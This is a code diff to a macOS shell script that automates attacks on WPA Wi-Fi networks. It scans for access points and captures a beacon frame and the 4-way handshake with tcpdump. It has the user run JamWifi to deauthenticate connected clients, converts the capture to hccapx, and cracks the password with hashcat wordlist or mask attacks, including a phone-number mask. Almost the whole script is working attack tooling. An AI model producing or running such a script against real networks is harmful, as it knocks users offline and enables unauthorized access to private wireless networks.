@@ -57,6 +57,8 @@ INTERFACE=$(sed ''"$chosen_interface"'q;d' interfaces)
 # delete interfaces file
 rm interfaces
 
+echo "\n------------------------------------------------------------------------------------------"
+
 # scan for wireless access points and have user choose BSSID and channel
 echo "\n[*] Scanning wireless access points...\n"
 sudo airport $INTERFACE -s > scan
@@ -79,8 +81,9 @@ do
 done
 
 # set BSSID and channel for later use
+SSID=$(sed -n '1!p' scan | sed ''"$chosen_ap"'q;d' | awk 'BEGIN {FS="([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})"} ; { print $1 }' | xargs)
 BSSID=$(sed -n '1!p' scan | sed ''"$chosen_ap"'q;d' | grep -E -o "([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")
-CHANNEL=$(sed -n '1!p' scan | sed ''"$chosen_ap"'q;d' | awk 'BEGIN {FS="([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})"} ; { print $2 }' | awk '{print $2}' | cut -d "," -f 1)
+CHANNEL=$(sed -n '1!p' scan | sed ''"$chosen_ap"'q;d' | awk 'BEGIN {FS="([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})"} ; { print $2 }' | awk '{print $2}')
 
 # delete scan file
 rm scan
@@ -91,20 +94,53 @@ sudo airport -z
 # set the channel
 sudo airport -c$CHANNEL
 
+echo "\n------------------------------------------------------------------------------------------"
+
 # capture a beacon frame from the AP
+echo "\n[*] Capturing beacon frame from access point"
+echo
 sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i $INTERFACE -w beacon.cap
 
+echo "\n------------------------------------------------------------------------------------------"
+
+# open JamWifi to deauth users and retrieve WPA handshake
+echo "\n[*] Opening JamWifi"
+open /Applications/JamWifi.app
+echo
+read -p "Enter your password and then press any key to continue..." -n 1 -s
+echo
+
+echo "\n------------------------------------------------------------------------------------------"
+
+echo "\n[*] Click 'Scan' to scan targets"
+echo "\n[*] Click on the target with ESSID $SSID, BSSID $BSSID, and CH $CHANNEL"
+echo "\n[*] Click 'Monitor'"
+echo
+read -p "Once in monitor mode press any key to continue..." -n 1 -s
+echo
+
+echo "\n------------------------------------------------------------------------------------------"
+
 # wait for the WPA handshake
+echo "\n[*] Click 'Do It!' in JamWifi to begin the deauth process and capture the WPA 4-way handshake"
+echo "\n[*] Once you get 4 frames or more click 'Done' in JamWifi and hit Ctrl-C in the terminal"
+echo
 sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $INTERFACE -w handshake.cap
 
-# open JamWifi to deauth access point and retrieve handshake
-open dependencies/JamWiFi.app
+echo "\n------------------------------------------------------------------------------------------"
 
 # merge the two files
-dependencies/joincap -w capture.cap beacon.cap handshake.cap
+echo "\n[*] Merging beacon and handshake files into capture file"
+mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
+
+echo "\n------------------------------------------------------------------------------------------"
 
 # convert capture file to hccapx format
-dependencies/cap2hccapx capture.cap capture.hccapx
+echo "\n[*] Converting capture file into hccapx file"
+echo
+./utils/cap2hccapx capture.cap capture.hccapx
+
+echo "\n------------------------------------------------------------------------------------------"
 
 # crack with hashcat
 echo
@@ -138,13 +174,13 @@ then
     # remove wordlist_choices file
     rm wordlist_choices
 
-    dependencies/hashcat -m 2500 capture.hccapx $DICTIONARY -O
+    hashcat -m 2500 capture.hccapx $DICTIONARY -O
 elif [[ $attack_choice = "b" ]]
 then
     echo
-    read -p "Enter the mask you would like to use \(ex: ?d?d?d for 3 digits\): " mask
+    read -p "Enter the mask you would like to use (i.e. ?d?d?d?d?d?d?d?d?d?d for a 10 digit phone number): " mask
 
-    dependencies/hashcat -m 2500 -a 3 capture.hccapx "$mask" -O
+    hashcat -m 2500 -a 3 capture.hccapx "$mask" -O
 fi
 
 # cleanup
